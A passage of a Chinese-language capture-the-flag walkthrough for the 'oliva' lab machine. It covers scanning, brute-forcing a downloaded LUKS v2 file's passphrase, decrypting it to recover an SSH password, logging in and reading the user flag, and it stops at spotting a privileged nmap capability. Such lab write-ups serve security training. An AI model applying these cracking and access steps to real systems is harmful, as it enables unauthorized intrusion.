

|   |   |   |
|---|---|---|
|oliva|easy|LUKS v2破解、bruteforce-luks工具使用、cryptsetup使用、cap_dac_read_search=eip、mysql使用|
# 主机发现
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ sudo netdiscover -i eth0 -r 192.168.44.148/24
```

# 服务扫描
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.148 
```

22，80
访问hhtp首页，点击click
自动下载出oliva文件
# LUKS v2 加密文件
file 查看是一份LUKS v2 加密文件
```c
┌──(kali㉿kali)-[~/下载]
└─$ file oliva
oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse

```

```c
┌──(kali㉿kali)-[~/下载]
└─$ sudo apt install bruteforce-luks


一直爆破到第970多个
Password found: bebita

```

爆破获取加密口令后，我们使用cryptsetup打开该文
```c
┌──(kali㉿kali)-[~/下载]
└─$ sudo cryptsetup luksOpen oliva olia_img
输入 oliva 的口令： bebita

```

打开后文件是在这个路径下创建的 /dev/mapper/olive_img，然后我们可以mount 命令挂载该文件。
```c
mount  /dev/mapper/olive_img /mnt
```

或者使用文件管理器打开文件

```
cryptsetup open --type luks oliva oliva
```

进去里面可以看到一份密码
```c
┌──(kali㉿kali)-[/media/kali/7839beec-705e-45c5-a982-3096ac116f6e]
└─$ cat mypass.txt 
Yesthatsmypass!

```

尝试用户名密码
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ ssh oliva@192.168.44.148  
//用户：oliva
//密码：Yesthatsmypass!

oliva@oliva:~$ cat user.txt 
HMVY0H8NgGJqbFzbgo0VMRm
```

# 提权

**getcap** 命令是在 Linux 系统中用于查看文件的特殊权限（capabilities）的工具。
```c
oliva@oliva:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/nmap cap_dac_read_search=eip
/usr/bin/ping cap_net_raw=ep
```

